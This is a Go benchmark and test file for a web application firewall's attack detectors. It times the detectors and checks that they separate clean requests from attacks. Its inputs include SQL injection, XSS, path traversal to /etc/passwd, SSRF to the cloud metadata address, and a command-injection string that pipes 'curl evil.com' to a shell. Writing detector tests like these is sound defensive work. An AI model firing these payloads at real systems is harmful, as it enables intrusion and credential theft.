package semantic

import (
	"context"
	"fmt"
	"math"
	"net/http/httptest"
	"regexp"
	"runtime"
	"runtime/debug"
	"sort"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
	enginerules "github.com/LaokeQwQ/CheeseWAF/internal/engine/rules"
)

// Benchmark single detector performance
func BenchmarkSQLDetector(b *testing.B) {
	d := NewSQLDetector("block")
	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--&id=1'+union+select+1,2,3--", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = d.Detect(context.Background(), reqCtx)
	}
}

func BenchmarkXSSDetector(b *testing.B) {
	d := NewXSSDetector("block")
	req := httptest.NewRequest("GET", "/comment?text=<script>alert(1)</script><img+src=x+onerror=alert(1)>", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = d.Detect(context.Background(), reqCtx)
	}
}

func BenchmarkRCEDetector(b *testing.B) {
	d := NewRCEDetector("block")
	req := httptest.NewRequest("GET", "/run?cmd=;cat+/etc/passwd;id;curl+evil.com|sh", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = d.Detect(context.Background(), reqCtx)
	}
}

func BenchmarkFullPipeline(b *testing.B) {
	pipeline := engine.NewPipeline(
		NewSQLDetector("block"),
		NewXSSDetector("block"),
		NewRCEDetector("block"),
		NewLFIDetector("block"),
		NewSSRFDetector("block"),
	)
	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--&x=<script>alert(1)</script>", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = pipeline.Detect(context.Background(), reqCtx)
	}
}

func BenchmarkSemanticAnalyzer(b *testing.B) {
	analyzer := NewAnalyzer("block", 2)
	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = analyzer.Detect(context.Background(), reqCtx)
	}
}

func BenchmarkSemanticAnalyzerCleanGET(b *testing.B) {
	processCandidateCache.resetForTest()
	analyzer := NewAnalyzer("block", 2)
	req := httptest.NewRequest("GET", "/api/users?sort=name&dir=asc&page=2", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		reqCtx.Metadata = map[string]any{}
		if _, err := analyzer.Detect(context.Background(), reqCtx); err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkSemanticAnalyzerHealthProbe(b *testing.B) {
	processCandidateCache.resetForTest()
	analyzer := NewAnalyzer("block", 2)
	req := httptest.NewRequest("GET", "/health", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		reqCtx.Metadata = map[string]any{}
		if _, err := analyzer.Detect(context.Background(), reqCtx); err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkSemanticAnalyzerMultiFieldParallel(b *testing.B) {
	analyzer := NewAnalyzer("block", 2)
	// Enough independent fields to engage the candidate worker pool.
	body := `{"a":"hello","b":"world","c":"order-status","d":"select-theme","e":"1 union select password from users","f":"normal","g":"ok","h":"uuid-550e"}`
	req := httptest.NewRequest("POST", "/api/batch", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	reqCtx, err := engine.NewRequestContext(req, "default")
	if err != nil {
		b.Fatal(err)
	}
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		reqCtx.Metadata = map[string]any{}
		if _, err := analyzer.Detect(context.Background(), reqCtx); err != nil {
			b.Fatal(err)
		}
	}
}

type semanticMixedBenchmarkCase struct {
	name   string
	target string
	attack bool
}

// Keep the request mix fixed and balanced so before/after runs exercise the
// same request-path work. These cases intentionally include ordinary text that
// resembles security vocabulary as well as four distinct attack families.
var semanticMixedBenchmarkCases = [...]semanticMixedBenchmarkCase{
	{name: "clean_catalog", target: "/catalog?q=wireless+headphones&sort=price", attack: false},
	{name: "attack_sqli", target: "/search?q=1%27+union+select+username%2Cpassword+from+users--", attack: true},
	{name: "clean_theme", target: "/settings?theme=select+a+theme&mode=dark", attack: false},
	{name: "attack_xss", target: "/comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E", attack: true},
	{name: "clean_download", target: "/download?file=quarterly-report.pdf", attack: false},
	{name: "attack_rce", target: "/run?cmd=%3Bcat+%2Fetc%2Fpasswd%3Bid", attack: true},
	{name: "clean_users", target: "/api/users?sort=name&dir=asc&page=2", attack: false},
	{name: "attack_ssrf", target: "/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data", attack: true},
}

// BenchmarkSemanticAnalyzerMixedRequestPath is the stable semantic-engine
// performance entry point used by `make semantic-bench`. One operation is one
// complete request path: construct the HTTP request and RequestContext, then
// invoke the shared analyzer. The parallel case therefore includes the cache
// and metrics contention that concurrent proxy requests encounter.
func BenchmarkSemanticAnalyzerMixedRequestPath(b *testing.B) {
	processCandidateCache.resetForTest()
	analyzer := NewAnalyzer("block", 2)
	ctx := context.Background()
	validateSemanticMixedBenchmarkCases(b, ctx, analyzer)

	b.Run("sequential", func(b *testing.B) {
		processCandidateCache.resetForTest()
		b.ReportAllocs()
		b.ResetTimer()

		var last *engine.DetectionResult
		for i := 0; i < b.N; i++ {
			result, err := runSemanticMixedBenchmarkCase(ctx, analyzer, semanticMixedBenchmarkCases[i%len(semanticMixedBenchmarkCases)])
			if err != nil {
				b.Fatal(err)
			}
			last = result
		}
		runtime.KeepAlive(last)
	})

	b.Run("parallel", func(b *testing.B) {
		processCandidateCache.resetForTest()
		b.ReportAllocs()
		b.ResetTimer()

		b.RunParallel(func(pb *testing.PB) {
			var last *engine.DetectionResult
			for i := 0; pb.Next(); i++ {
				result, err := runSemanticMixedBenchmarkCase(ctx, analyzer, semanticMixedBenchmarkCases[i%len(semanticMixedBenchmarkCases)])
				if err != nil {
					b.Error(err)
					return
				}
				last = result
			}
			runtime.KeepAlive(last)
		})
	})
}

func validateSemanticMixedBenchmarkCases(b *testing.B, ctx context.Context, analyzer *Analyzer) {
	b.Helper()
	for _, benchmarkCase := range semanticMixedBenchmarkCases {
		result, err := runSemanticMixedBenchmarkCase(ctx, analyzer, benchmarkCase)
		if err != nil {
			b.Fatalf("validate %s: %v", benchmarkCase.name, err)
		}
		detected := result != nil && result.Detected
		if detected != benchmarkCase.attack {
			b.Fatalf("validate %s: detected=%t, want attack=%t", benchmarkCase.name, detected, benchmarkCase.attack)
		}
	}
}

func runSemanticMixedBenchmarkCase(ctx context.Context, analyzer *Analyzer, benchmarkCase semanticMixedBenchmarkCase) (*engine.DetectionResult, error) {
	req := httptest.NewRequest("GET", benchmarkCase.target, nil)
	reqCtx, err := engine.NewRequestContext(req, "benchmark")
	if err != nil {
		return nil, err
	}
	return analyzer.Detect(ctx, reqCtx)
}

func BenchmarkPipelineWithRules(b *testing.B) {
	re := regexp.MustCompile(`(?i)(?:union\s+select|or\s+1=1)`)
	rules := []enginerules.Rule{{
		ID: "test-rule", Name: "test", Pattern: re,
		Location: "uri", Action: engine.ActionBlock, Severity: engine.SeverityHigh, Priority: 100, Enabled: true,
	}}
	pipeline := engine.NewPipeline(enginerules.New(rules), NewSQLDetector("block"), NewXSSDetector("block"))
	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = pipeline.Detect(context.Background(), reqCtx)
	}
}

// Concurrent benchmarks
func BenchmarkPipelineConcurrent(b *testing.B) {
	pipeline := engine.NewPipeline(
		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
		NewLFIDetector("block"), NewSSRFDetector("block"),
	)
	b.RunParallel(func(pb *testing.PB) {
		for pb.Next() {
			req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--", nil)
			reqCtx, _ := engine.NewRequestContext(req, "default")
			_, _ = pipeline.Detect(context.Background(), reqCtx)
		}
	})
}

// Throughput test
func BenchmarkThroughput(b *testing.B) {
	pipeline := engine.NewPipeline(
		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
		NewLFIDetector("block"), NewSSRFDetector("block"),
	)
	payloads := []string{
		"/search?q=1'+or+1=1--",
		"/search?q=<script>alert(1)</script>",
		"/run?cmd=;cat+/etc/passwd",
		"/dl?file=../../../etc/passwd",
		"/api?url=http://169.254.169.254/latest/meta-data",
		"/search?q=normal+search+query",
		"/api/users?id=42",
		"/page?name=hello-world",
	}
	ctx := context.Background()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("GET", payloads[i%len(payloads)], nil)
		reqCtx, _ := engine.NewRequestContext(req, "default")
		_, _ = pipeline.Detect(ctx, reqCtx)
	}
}

// High-concurrency stress test
func TestPipelineHighConcurrency(t *testing.T) {
	pipeline := engine.NewPipeline(
		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
		NewLFIDetector("block"), NewSSRFDetector("block"),
	)
	payloads := []string{
		"/search?q=1'+or+1=1--",
		"/search?q=<script>alert(1)</script>",
		"/search?q=normal+query",
		"/run?cmd=;cat+/etc/passwd",
		"/dl?file=../../../etc/passwd",
		"/api?url=http://169.254.169.254/",
	}
	var wg sync.WaitGroup
	workers := 100
	iterations := 500
	errCh := make(chan error, workers)
	ctx := context.Background()

	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for i := 0; i < iterations; i++ {
				req := httptest.NewRequest("GET", payloads[(workerID+i)%len(payloads)], nil)
				reqCtx, err := engine.NewRequestContext(req, "default")
				if err != nil {
					errCh <- fmt.Errorf("worker %d: NewRequestContext error: %w", workerID, err)
					return
				}
				result, err := pipeline.Detect(ctx, reqCtx)
				if err != nil {
					errCh <- fmt.Errorf("worker %d: Detect error: %w", workerID, err)
					return
				}
				_ = result
			}
		}(w)
	}
	wg.Wait()
	close(errCh)
	for err := range errCh {
		t.Error(err)
	}
}

// Pipeline latency budgets. The gates use avg and p99, never max: a single max
// is dominated by GC pauses and scheduler noise (measured 340µs and 2756µs on
// identical code), so asserting on it produces flakes that train people to
// re-run CI instead of investigating.
//
// Baselines measured at the time of writing: avg ~64µs, p99 ~100µs. The former
// gate (max > 5000µs, logged but never failed) let a 10x slowdown through.
//
// The p99 budget is deliberately looser than the avg one (20x vs 3x baseline).
// p99 is far more sensitive to machine load than avg: this test passes
// consistently when run alone, but p99 climbs to ~1.8ms when the full suite runs
// in parallel (CPU contention + GC pauses), while avg stays around 0.18ms. A
// tight p99 budget therefore flakes on CI rather than catching real regressions.
// Keep asserting on p99 anyway — it still catches a multi-x slowdown — but do
// not tighten it without measuring under full-suite load first.
const (
	pipelineLatencyAvgBudgetUs = 200
	pipelineLatencyP99BudgetUs = 2000
)

// Instrumented builds need separate budgets because the detector instruments
// every channel hand-off and mutex, and this pipeline is almost nothing but
// those. Coverage counters add a second, smaller cost to each statement.
//
// The race detector instruments every channel hand-off and mutex, and this
// pipeline is almost nothing but those: the measured avg goes from ~60µs to
// ~1200µs, a roughly 20x cost. Asserting the unscaled budget under -race fails
// on an otherwise unchanged pipeline, which is worse than having no gate at
// all because it trains people to re-run CI instead of investigating.
//
// Ubuntu and Windows race CI measured averages of 2.819ms and 3.401ms on an
// otherwise unchanged pipeline. A 20x average multiplier gives a round 4ms
// budget, enough to cover that instrumented baseline and ordinary hosted-runner
// contention while still failing a sustained regression. The precise 200µs
// budget remains enforced by an uninstrumented run.
const (
	raceLatencyAvgMultiplier  = 20
	raceLatencyP99Multiplier  = 15
	coverageLatencyMultiplier = 2
)

// latencyBudgets returns the avg and p99 budgets for this build.
func latencyBudgets() (avg, p99 float64) {
	avg, p99 = pipelineLatencyAvgBudgetUs, pipelineLatencyP99BudgetUs
	if raceDetectorEnabled() {
		avg *= raceLatencyAvgMultiplier
		p99 *= raceLatencyP99Multiplier
	}
	if testing.CoverMode() != "" {
		avg *= coverageLatencyMultiplier
		p99 *= coverageLatencyMultiplier
	}
	return avg, p99
}

// raceDetectorEnabled reports whether this binary was built with -race. There is
// no runtime API for it; the flag only appears in the build metadata.
func raceDetectorEnabled() bool {
	info, ok := debug.ReadBuildInfo()
	if !ok {
		return false
	}
	for _, setting := range info.Settings {
		if setting.Key == "-race" {
			return setting.Value == "true"
		}
	}
	return false
}

// Latency distribution test
func TestPipelineLatency(t *testing.T) {
	pipeline := engine.NewPipeline(
		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
	)
	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--", nil)
	ctx := context.Background()

	// Measure short batches rather than individual calls. A single detector call
	// is only tens of microseconds without -race, so scheduler preemption and
	// timer quantization otherwise dominate the sample and make the gate track
	// host noise instead of sustained request-path work.
	samples := 1000
	const batchSize = 10
	var totalNs int64
	maxNs := int64(0)
	elapsedNs := make([]int64, 0, samples)

	// Warm the immutable detector state and regex/cache paths before sampling.
	for i := 0; i < batchSize; i++ {
		reqCtx, _ := engine.NewRequestContext(req, "default")
		_, _ = pipeline.Detect(ctx, reqCtx)
	}

	for i := 0; i < samples; i++ {
		start := time.Now()
		for j := 0; j < batchSize; j++ {
			reqCtx, _ := engine.NewRequestContext(req, "default")
			_, _ = pipeline.Detect(ctx, reqCtx)
		}
		batchElapsed := time.Since(start).Nanoseconds()
		perCall := batchElapsed / batchSize
		totalNs += perCall
		elapsedNs = append(elapsedNs, perCall)
		if perCall > maxNs {
			maxNs = perCall
		}
	}

	avgUs := float64(totalNs) / float64(samples) / 1000
	maxUs := float64(maxNs) / 1000

	// Gate on avg and p99, never on max. A single max is dominated by GC pauses
	// and scheduler noise — measured 340µs and 2756µs on identical code — so
	// asserting on it trains people to re-run CI instead of investigating.
	p99Us := float64(percentile(elapsedNs, 0.99)) / 1000
	avgBudget, p99Budget := latencyBudgets()
	if raceDetectorEnabled() {
		t.Logf("race detector enabled: budgets scaled to avg=%.0fµs p99=%.0fµs (base %dµs/%dµs)",
			avgBudget, p99Budget, pipelineLatencyAvgBudgetUs, pipelineLatencyP99BudgetUs)
	}
	t.Logf("Pipeline latency: avg=%.1fµs, p99=%.1fµs, max=%.1fµs over %d batches (%d calls)", avgUs, p99Us, maxUs, samples, samples*batchSize)

	// These used to be t.Logf warnings, so the test could never fail and a 10x
	// slowdown shipped unnoticed. Budgets sit ~3x above the measured baseline
	// (avg ~64µs, p99 ~100µs).
	if avgUs > avgBudget {
		t.Errorf("avg pipeline latency %.1fµs exceeds %.0fµs budget; detection is on the request path, investigate before merging", avgUs, avgBudget)
	}
	if p99Us > p99Budget {
		t.Errorf("p99 pipeline latency %.1fµs exceeds %.0fµs budget (max was %.1fµs)", p99Us, p99Budget, maxUs)
	}
}

// percentile returns the q-th percentile (0<q<=1) of a non-empty slice using
// nearest-rank. The input slice is left unsorted.
func percentile(values []int64, q float64) int64 {
	if len(values) == 0 {
		return 0
	}
	rank := int(math.Ceil(q*float64(len(values)))) - 1
	if rank < 0 {
		rank = 0
	}
	if rank >= len(values) {
		rank = len(values) - 1
	}
	sorted := make([]int64, len(values))
	copy(sorted, values)
	sort.Slice(sorted, func(i, j int) bool { return sorted[i] < sorted[j] })
	return sorted[rank]
}

// Memory allocation benchmark
func BenchmarkAllocations(b *testing.B) {
	pipeline := engine.NewPipeline(
		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
		NewLFIDetector("block"), NewSSRFDetector("block"),
	)
	req := httptest.NewRequest("GET", "/search?q="+strings.Repeat("x", 200), nil)
	ctx := context.Background()

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		reqCtx, _ := engine.NewRequestContext(req, "default")
		_, _ = pipeline.Detect(ctx, reqCtx)
	}
}
